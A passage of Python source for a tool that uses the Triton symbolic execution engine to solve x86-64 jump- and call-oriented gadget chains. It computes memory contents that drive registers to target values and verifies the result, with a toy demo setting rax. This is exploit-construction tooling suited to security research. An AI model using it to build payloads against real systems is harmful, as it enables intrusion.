                address += len(code)
            except:
                return False

    actual = ctx.getConcreteRegisterValue(get_reg(ctx, target_reg))
    expected = target_value & 0xffffffffffffffff
    return actual == expected


def solve_chain_multi(gadget_chain_tuple, regs_init, controble_addr_base, offset_list,
                      permission_table, targets):
    """
    Multi-target solver: same as solve_chain but solves for multiple target registers
    simultaneously in one Triton context.

    Args:
        targets: list of {'reg_name': str, 'reg_value': int}
    """
    result = analyze_dispatch_with_virtual_mem(
        gadget_chain_tuple, regs_init, controble_addr_base, offset_list)
    if result[0] is None:
        return None
    dispatch_info, (concrete_mem, virtual_alloc) = result

    concrete_offsets = {}
    for addr, val in concrete_mem.items():
        if addr >= controble_addr_base:
            off = (addr - controble_addr_base) // 8
            concrete_offsets[off] = val

    perm_ext = list(permission_table) + [
        {'start': VIRTUAL_MEM_BASE, 'end': VIRTUAL_MEM_BASE + VIRTUAL_MEM_SIZE, 'permission': 'rw'}
    ]

    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs_init)

    for addr, val in concrete_mem.items():
        ctx.setConcreteMemoryAreaValue(addr, p64(val & 0xffffffffffffffff))
    for addr, val in virtual_alloc.items():
        ctx.setConcreteMemoryAreaValue(addr, p64(val & 0xffffffffffffffff))

    for i in offset_list:
        if i not in concrete_offsets:
            mem_addr = controble_addr_base + 8 * i
            memory_access = MemoryAccess(mem_addr, CPUSIZE.QWORD)
            ctx.symbolizeMemory(memory_access, f"mem_{i}")

    for g_idx, g_str in enumerate(gadget_chain_tuple):
        insts = g_str.split(' -> ')[1].split(' ; ')
        address = 0x400000 + g_idx * 0x1000
        for inst_str in insts:
            try:
                code = my_asm(inst_str)
                instruction = Instruction(address, code)
                ctx.processing(instruction)
                address += len(code)
            except:
                return None

    # Conjoin all target constraints
    ast_ctx = ctx.getAstContext()
    constraints = []
    for t in targets:
        target_ast = ctx.getRegisterAst(get_reg(ctx, t['reg_name']))
        constraints.append(target_ast == (t['reg_value'] & 0xffffffffffffffff))
    combined = constraints[0]
    for c in constraints[1:]:
        combined = ast_ctx.land([combined, c])
    solution = ctx.getModel(combined)

    if len(solution) == 0:
        return None

    result_map = {}
    for off, val in concrete_offsets.items():
        result_map[off] = hex(val)

    for k, v in solution.items():
        var_name = str(v.getVariable()).split(':')[0]
        value = v.getValue()
        if "mem_" in var_name:
            idx = int(var_name.split("_")[1])
            result_map[idx] = hex(value)

    result_map = map_virtual_to_real(result_map, virtual_alloc, dispatch_info,
                                     controble_addr_base, offset_list)
    return result_map


def verify_chain_multi(regs_init, gadget_chain_tuple, controble_addr_base,
                       result_map, permission_table, targets):
    """Concrete execution to verify multiple target registers."""
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs_init)

    for offset_idx, value_str in result_map.items():
        addr = controble_addr_base + offset_idx * 8
        val = int(value_str, 16) & 0xffffffffffffffff
        ctx.setConcreteMemoryAreaValue(addr, p64(val))

    for g_idx, g_str in enumerate(gadget_chain_tuple):
        insts = g_str.split(' -> ')[1].split(' ; ')
        address = 0x400000 + g_idx * 0x1000
        for inst_str in insts:
            try:
                code = my_asm(inst_str)
                instruction = Instruction(address, code)
                ctx.processing(instruction)
                if not read_write_check(instruction, permission_table):
                    return False
                address += len(code)
            except:
                return False

    for t in targets:
        actual = ctx.getConcreteRegisterValue(get_reg(ctx, t['reg_name']))
        expected = t['reg_value'] & 0xffffffffffffffff
        if actual != expected:
            return False
    return True


def get_dispatch_offsets(gadget_chain_tuple, regs_init, controble_addr_base, offset_list):
    """
    Identify which memory offsets are used for dispatch (pointers to next gadgets).
    These offsets MUST be preserved and cannot be overwritten by later chains.
    Data offsets (values read by gadget body) CAN be overwritten.

    Returns:
        set of dispatch offset indices, or None on failure.
    """
    result = analyze_dispatch_with_virtual_mem(
        gadget_chain_tuple, regs_init, controble_addr_base, offset_list)
    if result[0] is None:
        return None
    dispatch_info, (concrete_mem, virtual_alloc) = result

    dispatch_offsets = set()
    for info in dispatch_info:
        if 'dispatch_offset' in info:
            dispatch_offsets.add(info['dispatch_offset'])
        for off in info.get('pointer_offsets', []):
            dispatch_offsets.add(off)
        if info.get('type') == 'indirect' and len(info.get('pointer_offsets', [])) == 0:
            dispatch_offsets.add(info['src_offset'])
    return dispatch_offsets


def simulate_chain(regs_init, gadget_chain_tuple, controble_addr_base,
                   result_map, permission_table):
    """
    Concretely execute a solved chain and return the updated state.

    Returns:
        (new_regs_init, used_offsets) or (None, None) on failure.
        new_regs_init: dict of register values after execution
        used_offsets: set of memory offsets used by result_map
    """
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx = init_reg(ctx, regs_init)

    for offset_idx, value_str in result_map.items():
        addr = controble_addr_base + offset_idx * 8
        val = int(value_str, 16) & 0xffffffffffffffff
        ctx.setConcreteMemoryAreaValue(addr, p64(val))

    for g_idx, g_str in enumerate(gadget_chain_tuple):
        insts = g_str.split(' -> ')[1].split(' ; ')
        address = 0x400000 + g_idx * 0x1000
        for inst_str in insts:
            try:
                code = my_asm(inst_str)
                instruction = Instruction(address, code)
                ctx.processing(instruction)
                address += len(code)
            except:
                return None, None

    # Extract register state
    reg_names = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi',
                 'rbp', 'rsp', 'r8', 'r9', 'r10', 'r11',
                 'r12', 'r13', 'r14', 'r15', 'rip', 'eflags',
                 'cs', 'ss', 'ds', 'es', 'fs', 'gs']
    new_regs = {}
    for rn in reg_names:
        reg = get_reg(ctx, rn)
        if reg:
            new_regs[rn] = ctx.getConcreteRegisterValue(reg)

    used_offsets = set(result_map.keys())
    return new_regs, used_offsets


# ---------------------------------------------------------------------------
# Core solver
# ---------------------------------------------------------------------------

def solve_no_ret_mem_process(classify_res, regs_init, controble_addr_base, offset_list_init,
                              permission_table, gadgets_dict, target_reg, target_value,
                              stack_mem={}, mode=0, locked_mem=None):
    res_f = {}
    for i in range(len(classify_res)):
        for a in product(*classify_res[i]):
            if len(res_f) > 0 and mode != 0:
                return res_f

            result_map = solve_chain(
                a, regs_init, controble_addr_base, offset_list_init,
                permission_table, target_reg, target_value,
                locked_mem=locked_mem)

            if result_map is None:
                continue

            if not verify_chain(regs_init, a, controble_addr_base,
                                result_map, permission_table, target_reg, target_value):
                continue

            remaining = offset_list_init.copy()
            for idx in result_map:
                if idx in remaining:
                    remaining.remove(idx)
            res_f[a] = [result_map, remaining, time.time()]

    return res_f


# ---------------------------------------------------------------------------
# Parallel solver
# ---------------------------------------------------------------------------

def solve_no_ret_mem_func(regs_init, classify_res, controble_addr_base, offset_list_init,
                           permission_table, gadgets_dict, target_reg, target_value,
                           num_threads=4, stack_mem={}, mode=0, locked_mem=None):
    if len(classify_res) == 0:
        return []

    chunk_size = max(1, len(classify_res) // num_threads)
    chunks = [
        classify_res[i * chunk_size:i * chunk_size + chunk_size]
        for i in range(num_threads)
    ]
    chunks[-1] = chunks[-1] + classify_res[chunk_size * num_threads:]
    chunks = [c for c in chunks if len(c) > 0]

    solve_func = partial(
        solve_no_ret_mem_process,
        regs_init=regs_init, controble_addr_base=controble_addr_base,
        offset_list_init=offset_list_init, permission_table=permission_table,
        gadgets_dict=gadgets_dict, target_reg=target_reg,
        target_value=target_value, stack_mem=stack_mem, mode=mode,
        locked_mem=locked_mem)

    if mode == 0:
        dynaminc_params = [(_,) for _ in chunks]
        with multiprocessing.Pool(processes=min(num_threads, len(chunks))) as pool:
            all_res_process = pool.starmap(solve_func, dynaminc_params)
        res = []
        for proc_res in all_res_process:
            for g, v in proc_res.items():
                res.append({'gadget_chain': g, 'address_map': v[0],
                            'offset_list': v[1], 'time': v[2]})
    else:
        res = []
        with multiprocessing.Pool(processes=min(num_threads, len(chunks))) as pool:
            for chunk_res in pool.imap_unordered(solve_func, chunks):
                if chunk_res:
                    for g, v in chunk_res.items():
                        res.append({'gadget_chain': g, 'address_map': v[0],
                                    'offset_list': v[1], 'time': v[2]})
                    pool.terminate()
                    pool.join()
                    break
    return res


# ---------------------------------------------------------------------------
# Multi-target core solver
# ---------------------------------------------------------------------------

def solve_no_ret_mem_process_multi(classify_res, regs_init, controble_addr_base, offset_list_init,
                                    permission_table, gadgets_dict, targets,
                                    stack_mem={}, mode=0):
    """Same as solve_no_ret_mem_process but solves for multiple target registers at once."""
    res_f = {}
    for i in range(len(classify_res)):
        for a in product(*classify_res[i]):
            if len(res_f) > 0 and mode != 0:
                return res_f

            result_map = solve_chain_multi(
                a, regs_init, controble_addr_base, offset_list_init,
                permission_table, targets)

            if result_map is None:
                continue

            if not verify_chain_multi(regs_init, a, controble_addr_base,
                                      result_map, permission_table, targets):
                continue

            remaining = offset_list_init.copy()
            for idx in result_map:
                if idx in remaining:
                    remaining.remove(idx)
            res_f[a] = [result_map, remaining, time.time()]

    return res_f


# ---------------------------------------------------------------------------
# Multi-target parallel solver
# ---------------------------------------------------------------------------

def solve_no_ret_mem_func_multi(regs_init, classify_res, controble_addr_base, offset_list_init,
                                 permission_table, gadgets_dict, targets,
                                 num_threads=4, stack_mem={}, mode=0):
    """Same as solve_no_ret_mem_func but solves for multiple target registers at once."""
    if len(classify_res) == 0:
        return []

    chunk_size = max(1, len(classify_res) // num_threads)
    chunks = [
        classify_res[i * chunk_size:i * chunk_size + chunk_size]
        for i in range(num_threads)
    ]
    chunks[-1] = chunks[-1] + classify_res[chunk_size * num_threads:]
    chunks = [c for c in chunks if len(c) > 0]

    solve_func = partial(
        solve_no_ret_mem_process_multi,
        regs_init=regs_init, controble_addr_base=controble_addr_base,
        offset_list_init=offset_list_init, permission_table=permission_table,
        gadgets_dict=gadgets_dict, targets=targets,
        stack_mem=stack_mem, mode=mode)

    if mode == 0:
        dynaminc_params = [(_,) for _ in chunks]
        with multiprocessing.Pool(processes=min(num_threads, len(chunks))) as pool:
            all_res_process = pool.starmap(solve_func, dynaminc_params)
        res = []
        for proc_res in all_res_process:
            for g, v in proc_res.items():
                res.append({'gadget_chain': g, 'address_map': v[0],
                            'offset_list': v[1], 'time': v[2]})
    else:
        res = []
        with multiprocessing.Pool(processes=min(num_threads, len(chunks))) as pool:
            for chunk_res in pool.imap_unordered(solve_func, chunks):
                if chunk_res:
                    for g, v in chunk_res.items():
                        res.append({'gadget_chain': g, 'address_map': v[0],
                                    'offset_list': v[1], 'time': v[2]})
                    pool.terminate()
                    pool.join()
                    break
    return res


# ---------------------------------------------------------------------------
# Pretty-print
# ---------------------------------------------------------------------------

def print_memory_layout(result, controble_addr_base, gadgets_dict):
    if len(result) == 0:
        print("No solution found.")
        return
    for idx, r in enumerate(result):
        print(f"\n{'='*60}")
        print(f"Solution {idx+1}")
        print(f"{'='*60}")
        print("Gadget chain:")
        for g in r['gadget_chain']:
            addr_s = g.split(' -> ')[0]
            inst = g.split(' -> ')[1]
            print(f"  {addr_s}: {inst}")
        print(f"\nMemory layout (offset -> value):")
        sorted_map = dict(sorted(r['address_map'].items()))
        for offset, value in sorted_map.items():
            addr_hex = hex(controble_addr_base + offset * 8)
            value_int = int(value, 16) if isinstance(value, str) else value
            gadget_name = ""
            addr_key = "0x" + hex(value_int)[2:].zfill(16)
            if addr_key in gadgets_dict:
                gadget_name = f"  <- {gadgets_dict[addr_key]}"
            elif (value_int >= controble_addr_base and
                  value_int < controble_addr_base + 0x100000):
                # Pointer into controllable memory (dispatch indirection)
                target_off = (value_int - controble_addr_base) // 8
                gadget_name = f"  <- ptr to offset [{target_off}]"
            print(f"  [{offset:3d}] {addr_hex} = {value}{gadget_name}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    gadgets_dict = {
        '0x0000000000151bb0': 'mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]',
        '0x000000000005b4d0': 'mov rsp, rdx ; add rsp, 0x30 ; ret',
        '0x0000000000050000': 'mov rsi, qword ptr [rdi + 8] ; mov rdx, rdi ; jmp qword ptr [rsi]',
        '0x0000000000050010': 'mov rcx, rdx ; call qword ptr [rcx + 0x30]',
        '0x0000000000050050': 'mov rax, qword ptr [rcx] ; jmp qword ptr [rsi + 0x10]'
    }

    controble_addr_base = 0x55555555b310
    regs = {
        'rax': 0, 'rbx': 0, 'rcx': 0, 'rdx': 0,
        'rsi': 0, 'rdi': controble_addr_base,
        'rbp': 0x7fff80010000, 'rsp': 0x7fff80010000,
        'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0,
        'r12': 0, 'r13': 0, 'r14': 0, 'r15': 0,
        'rip': 0, 'eflags': 0x202,
        'cs': 51, 'ss': 43, 'ds': 0, 'es': 0, 'fs': 0, 'gs': 0
    }

    target_reg = 'rax'
    target_value = 0xdeadbeef

    classify_res = [[
        ['0x0000000000050000 -> mov rsi, qword ptr [rdi + 8] ; mov rdx, rdi ; jmp qword ptr [rsi]'],
        ['0x0000000000050010 -> mov rcx, rdx ; call qword ptr [rcx + 0x30]'],
        ['0x0000000000050050 -> mov rax, qword ptr [rcx] ; jmp qword ptr [rsi + 0x10]']
    ]]

    offset_list = list(range(256))

    permission_table = [
        {'start': controble_addr_base, 'end': controble_addr_base + 0x10000, 'permission': 'rw'},
        {'start': 0x7fff80000000, 'end': 0x7fff80020000, 'permission': 'rw'},
    ]

    print(f"Target: {target_reg} = {hex(target_value)}")
    print(f"Controllable base: {hex(controble_addr_base)}")
    print(f"Initial rdi = {hex(regs['rdi'])}")
    print()

    result_dict = solve_no_ret_mem_process(
        classify_res, regs, controble_addr_base, offset_list,
        permission_table, gadgets_dict, target_reg, target_value)

    if len(result_dict) > 0:
        result = []
        for g, v in result_dict.items():
            result.append({'gadget_chain': g, 'address_map': v[0],
                           'offset_list': v[1], 'time': v[2]})
        print_memory_layout(result, controble_addr_base, gadgets_dict)
    else:
        print("No solution found.")
